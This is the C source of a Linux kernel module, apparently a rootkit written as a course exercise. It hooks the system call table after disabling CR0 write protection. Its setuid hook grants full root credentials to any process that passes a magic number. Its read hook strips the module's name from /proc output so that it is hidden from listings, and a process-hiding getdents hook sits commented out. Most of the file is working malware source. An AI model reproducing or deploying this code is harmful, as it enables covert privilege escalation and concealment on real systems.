#include <linux/module.h>      // for all modules
#include <linux/moduleparam.h> 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/file.h>
#define MAGIC_NUMBER 12345
//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

#define BUFFLEN 32

struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};

/* static int sneaky_pid = 0; */
/* module_param(sneaky_pid,int,S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP); */
/* MODULE_PARM_DESC(sneaky_pid, "sneaky_pid"); */

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
/* Setuid syscall hook */
asmlinkage int (*origin_setuid) (uid_t uid);

/* Malicious setuid hook syscall */
asmlinkage int sneaky_setuid(uid_t uid)
{
  if (uid == MAGIC_NUMBER)
    {
      /* Create new cred struct */
      struct cred *new_cred;
      /* Create uid struct */
      //      kuid_t nuid;
      /* Set uid struct value to 0 */
      //nuid.val = 0;
      /* Print UID and EUID of current process to dmesg */
      printk(KERN_INFO "[+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
      printk(KERN_WARNING "[!] Attempting UID change!");
      /* Prepares new set of credentials for task_struct of current process */
      new_cred = prepare_creds();
      /* Set uid of new cred struct to 0 */
      new_cred->uid = GLOBAL_ROOT_UID;
      new_cred->gid = GLOBAL_ROOT_GID;
      new_cred->suid = GLOBAL_ROOT_UID;
      new_cred->sgid = GLOBAL_ROOT_GID;
      new_cred->euid = GLOBAL_ROOT_UID;
      new_cred->egid = GLOBAL_ROOT_GID;
      new_cred->fsuid = GLOBAL_ROOT_UID;
      new_cred->fsgid = GLOBAL_ROOT_GID;
      /* Commit cred to task_struct of process */
      commit_creds(new_cred);
      printk(KERN_WARNING "[!] Changes Complete!");
      printk(KERN_INFO "after change [+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
    }
  /* Call original setuid syscall */
  return origin_setuid(uid);
}
asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
  /* //hide the sneaky process */
  /* int bpos; */
  /* int sneaky_len; */
  /* char d_type; */
  /* struct linux_dirent* d; */
  
  /* printk("sneaky_pid = %d\n",sneaky_pid); */
  /* char pid[16]; */
  /* sprintf(pid,"%d",sneaky_pid); */
  
  /* int read = original_getdents(fd,dirp,count); */
  /* if(read == 0){ */
  /*   printk("end of directory\n"); */
  /*   return read; */
  /* }  */
  /* if(read == -1){ */
  /*   printk("getdents failed\n"); */
  /*   return read; */
  /* } */
  /* //printk("read = %d\n",read); */
  /* for(bpos=0;bpos<read;){ */
  /*   d = (struct linux_dirent *)((char*)dirp + bpos); */
  /*   char* name = d->d_name; */
  /*   d_type = *((char*)dirp+bpos+d->d_reclen-1); */
  /*   if(strstr(name,"sneaky_process") != NULL || strcmp(name,pid)==0 ){ */
  /*     printk("this is the sneaky_process\n"); */
  /*     sneaky_len = d->d_reclen; */
  /*     //printk("sneaky_len = %d\n",sneaky_len); */
  /*     //printk("src = %d, des = %d\n",(char*)dirp+bpos+sneaky_len,(char*)dirp+bpos); */
  /*     int des = memmove(((char*)dirp+bpos),((char*)dirp+bpos+sneaky_len),read-bpos-sneaky_len); */
  /*     //printk("des = %d\n",des); */
  /*     read -= sneaky_len; */
  /*   } */
  /*   else{ */
  /*     bpos += d->d_reclen; */
  /*     //printk("d->d_reclen = %d, bpos = %d\n",d->d_reclen,bpos); */
  /*   } */
  /* } */
  /* return read; */
  return original_getdents(fd, dirp, count);
}

asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count){
  
  char* get_fp = (char*)__get_free_page(GFP_TEMPORARY);
  struct file* file_get = fget(fd);
  char* cur_path = d_path(&file_get->f_path, get_fp, PAGE_SIZE);
  
  ssize_t read = original_read(fd,buf,count);
  char* temp = strstr((char*)buf,"sneaky_mod");
  if(temp != NULL){
    char* newlineptr = strchr(temp,'\n');
    if(newlineptr != NULL){
      if(strstr(cur_path,"/proc")!=NULL){
        read = read - (newlineptr - temp + 1);
        memmove(temp,newlineptr+1,strlen(newlineptr+1)+1);
        return read;
      }
    }
  }
  return read;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  origin_setuid = (void*)*(sys_call_table + __NR_setuid);
  *(sys_call_table + __NR_setuid) = (unsigned long)sneaky_setuid; 
  //getdents
  original_getdents = (void*)*(sys_call_table + __NR_getdents);  
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents; 
  //read
  original_read = (void*)*(sys_call_table + __NR_read);  
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read; 
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;
    *(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

